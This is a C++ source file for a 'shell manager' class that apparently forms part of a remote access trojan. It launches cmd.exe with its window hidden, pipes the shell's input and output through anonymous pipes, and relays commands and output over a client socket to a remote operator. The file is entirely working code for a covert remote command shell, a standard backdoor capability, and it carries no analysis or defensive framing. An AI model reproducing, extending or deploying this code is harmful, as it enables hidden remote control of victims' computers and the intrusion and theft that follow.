// MyShellManager.cpp: implementation of the CMyShellManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "MyShellManager.h"
#include <tchar.h>

CMyShellManager::CMyShellManager(CClientSocket *pClient) :CManager(pClient)
{
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	m_hReadPipeHandle = NULL;
	m_hWritePipeHandle = NULL;
	m_hReadPipeShell = NULL;
	m_hWritePipeShell = NULL;

	if (!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
	{
		if (m_hReadPipeHandle != NULL) CloseHandle(m_hReadPipeHandle);
		if (m_hWritePipeShell != NULL) CloseHandle(m_hWritePipeShell);
		return;
	}

	if (!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0))
	{
		if (m_hWritePipeHandle != NULL)	CloseHandle(m_hWritePipeHandle);
		if (m_hReadPipeShell != NULL) CloseHandle(m_hReadPipeShell);
		return;
	}

	STARTUPINFO si = { 0 };
	memset((void *)&si, 0, sizeof(si));
	GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput = m_hReadPipeShell;
	si.hStdOutput = si.hStdError = m_hWritePipeShell;

	PROCESS_INFORMATION pi = { 0 };
	memset((void *)&pi, 0, sizeof(pi));

	TCHAR strShellPath[MAX_PATH] = { 0 };
	GetSystemDirectory(strShellPath, MAX_PATH);
	lstrcat(strShellPath, _T("\\cmd.exe"));

	if (!CreateProcess(NULL, strShellPath, NULL, NULL, TRUE,
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi))
	{
		CloseHandle(m_hReadPipeHandle);
		CloseHandle(m_hWritePipeHandle);
		CloseHandle(m_hReadPipeShell);
		CloseHandle(m_hWritePipeShell);
		return;
	}

	m_hProcessHandle = pi.hProcess;
	m_hThreadHandle = pi.hThread;

	BYTE bToken = TOKEN_SHELL_START;
	CManager::Send((LPBYTE)&bToken, 1);
	WaitForDialogOpen();
	m_hThreadRead = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadPipeThread, (LPVOID)this, 0, NULL);
	m_hThreadMonitor = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, (LPVOID)this, 0, NULL);
}

CMyShellManager::~CMyShellManager()
{
	TerminateThread(m_hThreadRead, 0);
	TerminateProcess(m_hProcessHandle, 0);
	TerminateThread(m_hThreadHandle, 0);

	WaitForSingleObject(m_hThreadMonitor, 2000);
	TerminateThread(m_hThreadMonitor, 0);

	if (m_hReadPipeHandle != NULL)
		DisconnectNamedPipe(m_hReadPipeHandle);
	if (m_hWritePipeHandle != NULL)
		DisconnectNamedPipe(m_hWritePipeHandle);
	if (m_hReadPipeShell != NULL)
		DisconnectNamedPipe(m_hReadPipeShell);
	if (m_hWritePipeShell != NULL)
		DisconnectNamedPipe(m_hWritePipeShell);

	CloseHandle(m_hReadPipeHandle);
	CloseHandle(m_hWritePipeHandle);
	CloseHandle(m_hReadPipeShell);
	CloseHandle(m_hWritePipeShell);

	CloseHandle(m_hProcessHandle);
	CloseHandle(m_hThreadHandle);
	CloseHandle(m_hThreadMonitor);
	CloseHandle(m_hThreadRead);
}

DWORD WINAPI CMyShellManager::MonitorThread(LPVOID lparam)
{
	CMyShellManager *pThis = (CMyShellManager *)lparam;
	HANDLE hThread[2];
	hThread[0] = pThis->m_hProcessHandle;
	hThread[1] = pThis->m_hThreadRead;
	WaitForMultipleObjects(2, hThread, FALSE, INFINITE);

	TerminateThread(pThis->m_hThreadRead, 0);
	TerminateProcess(pThis->m_hProcessHandle, 1);

	pThis->m_pClient->Disconnect();
	return 0;
}

void CMyShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}

	unsigned long ByteWrite;

	WriteFile(m_hWritePipeHandle, lpBuffer, nSize, &ByteWrite, NULL);
}

DWORD WINAPI CMyShellManager::ReadPipeThread(LPVOID lparam)
{
	char ReadBuff[1024];
	DWORD BytesRead, TotalBytesAvail;
	CMyShellManager *pThis = (CMyShellManager *)lparam;

	while (PeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, 1024, &BytesRead, &TotalBytesAvail, NULL))
	{
		Sleep(150);

		if (BytesRead <= 0) continue;

		LPBYTE lpBuffer = (LPBYTE)GlobalAlloc(GPTR, TotalBytesAvail);
		ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);

		pThis->Send(lpBuffer, BytesRead);
		GlobalFree(lpBuffer);
	}

	return 0;
}
